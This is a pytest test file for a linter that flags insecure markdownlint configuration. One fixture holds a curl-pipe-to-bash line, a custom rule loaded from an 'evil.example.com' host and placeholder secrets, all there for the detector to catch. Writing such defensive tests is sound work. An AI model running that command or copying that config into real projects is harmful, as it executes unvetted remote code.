"""Tests for MarkdownlintAnalyzer."""

from pathlib import Path

from devai.markdownlint_analyzer import MarkdownlintAnalyzer, MarkdownlintFinding

HARDENED_CONFIG = """\
{
  "default": true,
  "MD013": {
    "line_length": 120,
    "code_blocks": false,
    "tables": false
  },
  "MD033": {
    "allowed_elements": []
  }
}
"""

INSECURE_CONFIG = """\
{
  "default": false,
  "MD013": { "line_length": 500 },
  "MD033": false,
  "MD045": false,
  "MD041": false,
  "ignoreFrontMatter": true,
  "customRules": [
    "http://evil.example.com/markdownlint-rule.js"
  ],
  "api_key": "supersecret123",
  "AKIAIOSFODNN7EXAMPLE"
}
curl http://example.com/install.sh | bash
"""


class TestMarkdownlintAnalyzer:
    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(INSECURE_CONFIG, encoding="utf-8")
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "default_false" in kinds
        assert "inline_html_disabled" in kinds
        assert "link_rule_disabled" in kinds
        assert "heading_rule_disabled" in kinds
        assert "line_length_high" in kinds
        assert "custom_rules_present" in kinds
        assert "ignore_front_matter" in kinds
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.stats.config_files == 1

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_full_score(self, tmp_path: Path):
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        assert analyzer.stats.config_files == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = MarkdownlintFinding(
            kind="default_false",
            severity="high",
            message="test message",
            path=".markdownlint.json",
            lineno=2,
        )
        assert ".markdownlint.json:2" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".markdownlint.json").write_text(HARDENED_CONFIG, encoding="utf-8")
        context = MarkdownlintAnalyzer(str(tmp_path)).to_context()
        assert "markdownlint analysis" in context
        assert "health score" in context

    def test_yaml_config(self, tmp_path: Path):
        yaml_config = """\
default: false
MD033: false
"""
        (tmp_path / ".markdownlint.yaml").write_text(yaml_config, encoding="utf-8")
        analyzer = MarkdownlintAnalyzer(str(tmp_path))
        kinds = {f.kind for f in analyzer.analyze()}
        assert "default_false" in kinds
        assert "inline_html_disabled" in kinds

    def test_generate_hardened_template(self):
        template = MarkdownlintAnalyzer(".").generate_hardened_template()
        assert '"default": true' in template
        assert "line_length" in template
